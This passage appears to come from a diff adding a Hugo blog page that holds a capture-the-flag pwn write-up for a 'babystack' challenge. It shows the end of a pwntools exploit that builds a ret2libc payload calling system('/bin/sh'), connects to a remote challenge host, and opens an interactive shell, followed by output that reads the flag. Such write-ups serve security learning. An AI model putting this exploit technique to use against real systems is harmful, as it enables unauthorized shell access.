+	payload <span style="color:#f92672">+=</span> p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)))
+	payload <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>])
+	add(<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>, payload)
+
+	p<span style="color:#f92672">.</span>interactive()
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+  
+    p <span style="color:#f92672">=</span> process(BINARY)
+
+    <span style="color:#66d9ef">if</span> len(argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+    	<span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;d&#39;</span>:
+        	p <span style="color:#f92672">=</span> remote(HOST, PORT)
+        <span style="color:#66d9ef">else</span>:
+        	cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">        	&#39;&#39;&#39;</span>
+        	gdb<span style="color:#f92672">.</span>attach(p, cmd)
+    exploit()
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">@m00n ➜ babystack git:(master) ✗ python main.py x
+[+] Starting local process &#39;./main&#39;: pid 9060
+[+] Opening connection to 35.192.113.20 on port 3000: Done
+[*] Switching to interactive mode
+$ ls
+flag.txt
+main
+$ cat f*
+UNITYCTF2020{406b0e859139e5c897e2fdfb8f33634e}
+$ 
+</code></pre></div>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://fikriguska.github.io/tags/writeup">writeup</a></span><span class="tag"><a href="https://fikriguska.github.io/tags/pwn">pwn</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>926 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-03-17 07:00 &#43;0700</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="https://fikriguska.github.io/posts/2020/08/hacktoday-2020-quals-sum/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">Hacktoday 2020 (Quals) - sum</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://fikriguska.github.io/posts/2020/03/tulisan-pertama/">
+                                <span class="button__text">Tulisan Pertama</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+            <div id="comments" class="thin">
+                <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "fikriguska" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>2020</span>
+	    <span>Indonesia</span>
+            
+                <span><a href="https://fikriguska.github.io">Bintang Fikriguska</a></span>
+            
+            
+            <span> <a href="https://fikriguska.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://fikriguska.github.io/bundle.min.71be052e49740d65a77749a66c7e41b2f934c67fe08f37bf036d77cf7c34c90c83122f356c5fe8502d77a613eae1e3d900920dea1b5503167036da04f2798f19.js" integrity="sha512-cb4FLkl0DWWnd0mmbH5Bsvk0xn/gjze/A213z3w0yQyDEi81bF/oUC13phPq4ePZAJIN6htVAxZwNtoE8nmPGQ=="></script>
+
+
+
+    </body>
+</html>
